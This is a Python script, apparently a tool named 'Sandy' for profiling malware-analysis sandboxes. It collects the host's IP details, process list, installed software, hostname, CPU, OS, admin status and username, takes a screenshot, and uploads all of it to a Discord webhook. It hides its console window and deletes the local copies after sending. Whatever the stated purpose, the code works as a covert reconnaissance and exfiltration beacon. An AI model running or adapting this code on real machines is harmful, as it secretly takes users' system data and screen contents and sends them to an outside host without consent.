# Copyright 2022 Dimitrios Kalopisis
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import subprocess
import platform
import os
import ctypes
import pyautogui
from datetime import date
from discord_webhook import DiscordWebhook

WEBHOOK = ""
today = date.today()
DATE = date.today().strftime('%d/%m/%Y').replace('/', '-')

def get_ip_info():
    """
    Get information on the sandbox IP address.
    """
    response = requests.get("https://utilities.tk/network/info")
    response.raise_for_status()
    with open(f"report-{DATE}.txt", "w") as f:
        f.write("# Sandy The Sandbox Enumeration Tool\nBEGINING OF REPORT\n\n")
        f.write("Ip Info:\n\n")
        f.write(response.text)
        f.write("\n------------------------------------------------------------------------------------------------------------\n")

def get_process_list():
    """
    Get the process list of the sandbox.
    """
    result = subprocess.Popen(f"tasklist", stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    if err:
        out = "Error While Getting Processes from Sandbox"
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("Process List:\n")
        f.write(out)
        f.write("------------------------------------------------------------------------------------------------------------\n")
        

def get_installed_software():
    """
    Get the installed software of the sandbox.
    """
    software = """"""
    Data = subprocess.check_output(['wmic', 'product', 'get', 'name'])
    a = str(Data)
    try:
        for i in range(len(a)):
            software = software + a.split("\\r\\r\\n")[6:][i] + "\n"

    except IndexError as e:
        with open(f"report-{DATE}.txt", "a") as f:
            f.write("Installed Software:\n" + software + "\n")
            f.write("------------------------------------------------------------------------------------------------------------\n")

def get_hostname():
    """
    Get the hostname of the sandbox.
    """
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("Hostname:\n" + platform.node() + "\n")
        f.write("------------------------------------------------------------------------------------------------------------\n")

def get_cpu():
    """
    Get the CPU of the sandbox.
    """
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("CPU:\n" + platform.processor() + "\n")
        f.write("------------------------------------------------------------------------------------------------------------\n")

def get_os():
    """
    Get the OS of the sandbox.
    """
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("OS:\n" + platform.platform() + "\n")
        f.write("------------------------------------------------------------------------------------------------------------\n")

def is_admin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("Is Admin:\n" + str(is_admin) + "\n")
        f.write("------------------------------------------------------------------------------------------------------------\n")

def get_username():
    """
    Get the username of the sandbox.
    """
    with open(f"report-{DATE}.txt", "a") as f:
        f.write("Username:\n" + os.getlogin() + "\n")
        f.write("------------------------------------------------------------------------------------------------------------\n")

def get_screenshot():
    Screenshot = pyautogui.screenshot()
    path = os.environ["temp"] +"\\s.png"
    Screenshot.save(path)

get_ip_info()
get_process_list()
get_hostname()
get_cpu()
get_os()
is_admin()
get_username()
get_installed_software()
get_screenshot()

webhook = DiscordWebhook(url=WEBHOOK, username="Sandy")
with open(f"report-{DATE}.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='report-{DATE}.txt')
with open(os.environ["temp"] +"\\s.png", "rb") as f:
    webhook.add_file(file=f.read(), filename='screenshot.png')

response = webhook.execute()

os.remove(f"report-{DATE}.txt")
os.remove(os.environ["temp"] +"\\s.png")